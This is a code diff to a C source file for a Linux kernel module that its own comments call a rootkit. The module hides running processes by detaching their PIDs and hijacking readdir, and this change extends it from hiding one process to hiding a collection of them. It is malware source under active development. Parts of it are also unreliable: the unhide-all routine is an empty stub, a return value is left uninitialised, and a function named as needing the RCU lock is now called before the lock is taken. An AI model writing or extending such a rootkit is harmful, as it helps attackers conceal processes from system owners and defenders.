@@ -8,29 +8,20 @@
 #include "processHider.h"
 #include "readdirHijack.h"
 #include "processHiderPidManipulation.h"
+#include "HiddenProcessCollection.h"
 
 #ifndef CONFIG_PROFILING
 	#error "this module requires config profiling enabled"
 #endif
 
-//todo: prevent hiding processes that are already hidden..  test this..
 
-
-//todo: group these to allow hiding multiple tasks..
-struct restorableHiddenTask { //TODO: rename this
-	void *task;
-	struct pid *originalPid;
-};
-
-struct restorableHiddenTask onlyHiddenTask = {NULL};
+static HiddenProcessCollection collection = NULL;
 
 // Function Prototypes
-static struct restorableHiddenTask hideProcessGivenRcuLockIsHeld(struct pid *pid);
+static struct restorableHiddenTask hideProcessGivenRcuLockIsHeld(int pidNumber);
 static int notificationFunctionOnTaskExit(struct notifier_block *notifierBlock, unsigned long unknownLong, void *task);
-static int isTaskHidden(void *task);
-static void restoreTaskGivenRcuLockIsHeld(struct restorableHiddenTask *taskToRestore);
+static void restoreTaskGivenRcuLockIsHeld(struct restorableHiddenTask taskToRestore);
 //
-
 
 
 struct notifier_block notificationOnProcessExit = {
@@ -47,79 +38,93 @@ int processHider_init(void) {
 		return error;
 	}
 
+	collection = createHiddenProcessCollection();
+	if (collection == NULL) {
+		return -1;
+	}
+
 	return 0;
 }
 
+static void unhideAllHiddenTasksGivenLockIsHeld(void) {
+	//TODO: write this
+}
 
 void processHider_exit(void) {
-	// show the process  perhaps.. otherwise it may be hide to kill / end it so that the rootkit is not visable
-   //unhijack_readdir();
-	// TODO: show the process  perhaps.. otherwise it may be hide to kill / end it so that the rootkit is not visable
-		// alternatively kill them / require that the tasks are dead first..
+	// perhaps kill hidden processes / require that the tasks are dead first..
 
-	//TODO: check there is no race condition when exiting e.g. if a process exits at the same time
+	//TODO: check that a race condition does not exist when exiting e.g. if a process exits at the same time
 
 	int error;
 	rcu_read_lock();
 
 	error = profile_event_unregister(PROFILE_TASK_EXIT, &notificationOnProcessExit);
 
-	// unhide hidden tasks
-	if (onlyHiddenTask.task != NULL) { // is a task still hidden..
-		restoreTaskGivenRcuLockIsHeld(&onlyHiddenTask);
-	}
+	unhideAllHiddenTasksGivenLockIsHeld();
 
 	rcu_read_unlock();
 }
 
+
+
 //returns error code...
 //PRESENTLY ONLY SUPPORTS HIDING ONE PROCESS
 int hideProcess(int pidNumber) {
-	struct pid *pid = find_get_pid(pidNumber); //todo: check allocation fo this...
-	if (pid == NULL) {
-		return -1;
-	}
+	int result;
 	
-	rcu_read_lock(); 	// hold tasklist_lock / or rcu_read_lock() held. per documentation in pid.h
-	
-	if (onlyHiddenTask.task != NULL) {
-		printError("warning another task was already hidden - this is not supported properly yet\n");
-		return -1;
-	}
+	if (isHiddenProcessCollectionFull(collection)) {
+		printError("Failed to hide process. Too may processes are hidden.\n");
+		result = -1;
+	} else {
+		struct restorableHiddenTask hiddenTask = hideProcessGivenRcuLockIsHeld(pidNumber);
 
-	onlyHiddenTask = hideProcessGivenRcuLockIsHeld(pid);
-	if (onlyHiddenTask.task == NULL) {
-		printError("failed to hide task\n");
+		rcu_read_lock(); 	// hold tasklist_lock / or rcu_read_lock() held. per documentation in pid.h
+
+		if (hiddenTask.task == NULL) {
+			result = -1;
+			printError("failed to hide task\n");
+		} else {
+			addHiddenProcessToCollection(collection, hiddenTask);
+		}
+
+		rcu_read_unlock();
 	}
 	
-	rcu_read_unlock();
-	
-	return 0;
+	return result;
 }
 
 int showProcess(int pid) {
 	rcu_read_lock();
 
-	// unhide hidden tasks
-	if (onlyHiddenTask.task != NULL) { // is a task still hidden..
-		restoreTaskGivenRcuLockIsHeld(&onlyHiddenTask);
+	if (isPidInCollection(collection, pid)) {
+		struct restorableHiddenTask restorableHiddenTask = removePidFromCollection(collection, pid);
+		restoreTaskGivenRcuLockIsHeld(restorableHiddenTask);
 	}
 
 	rcu_read_unlock();
 	return 0;
 }
 
-static struct restorableHiddenTask createRestorableTask(struct task_struct *task, struct pid *originalPid) {
+static struct restorableHiddenTask createRestorableTask(struct task_struct *task, struct pid *originalPid, int pidNumber) {
 	struct restorableHiddenTask result = {
 		.task = task,
 		.originalPid = originalPid,
+		.pidNumber = pidNumber,
 	};
 	return result;
 }
 
-static struct restorableHiddenTask hideProcessGivenRcuLockIsHeld(struct pid *pid) {
-	struct task_struct *task = pid_task(pid, PIDTYPE_PID);
+static struct restorableHiddenTask hideProcessGivenRcuLockIsHeld(int pidNumber) {
+	struct task_struct *task;
 	struct pid *originalPid;
+	struct pid *pid = find_get_pid(pidNumber); //todo: check allocation fo this...
+
+	if (pid == NULL) {
+		return createRestorableTask(NULL, NULL, -1); 	//TODO: improve ability to return failure
+	}
+
+
+	task = pid_task(pid, PIDTYPE_PID);
 
 	if (task != NULL) {
 		originalPid = detachPidAndGetOldPid(task, PIDTYPE_PID);
@@ -127,17 +132,17 @@ static struct restorableHiddenTask hideProcessGivenRcuLockIsHeld(struct pid *pid
 		originalPid = NULL;
 	}
 
-	return createRestorableTask(task, originalPid);
+	return createRestorableTask(task, originalPid, pidNumber);
 }
 
 static int notificationFunctionOnTaskExit(struct notifier_block *notifierBlock, unsigned long unknownLong, void *task) {
 	//printInfo("in notification function for exit - task is %p\n", task);
-	if (isTaskHidden(task)) {
-		//TODO: add support for hiding multiple tasks / get restorable task struct that corresponds to pid..
 
+	if (isTaskInCollection(collection, task)) {
+		struct restorableHiddenTask entry = removeTaskFromCollection(collection, task);
 		rcu_read_lock(); 	// hold tasklist_lock / or rcu_read_lock() held. per documentation in pid.h
 
-		restoreTaskGivenRcuLockIsHeld(&onlyHiddenTask);
+		restoreTaskGivenRcuLockIsHeld(entry);
 
 		rcu_read_unlock();
 	}
@@ -145,14 +150,9 @@ static int notificationFunctionOnTaskExit(struct notifier_block *notifierBlock, 
 	return 0;
 }
 
-static void restoreTaskGivenRcuLockIsHeld(struct restorableHiddenTask *taskToRestore) {
+static void restoreTaskGivenRcuLockIsHeld(struct restorableHiddenTask taskToRestore) {
 	printInfo("Unhiding task\n");
-	attach_pid(taskToRestore->task, PIDTYPE_PID, taskToRestore->originalPid);
-	taskToRestore->task = NULL; //mark as no longer hidden
+	attach_pid(taskToRestore.task, PIDTYPE_PID, taskToRestore.originalPid);
 }
 
-
-static int isTaskHidden(void *task) {
-	return (task == onlyHiddenTask.task);
-}
 
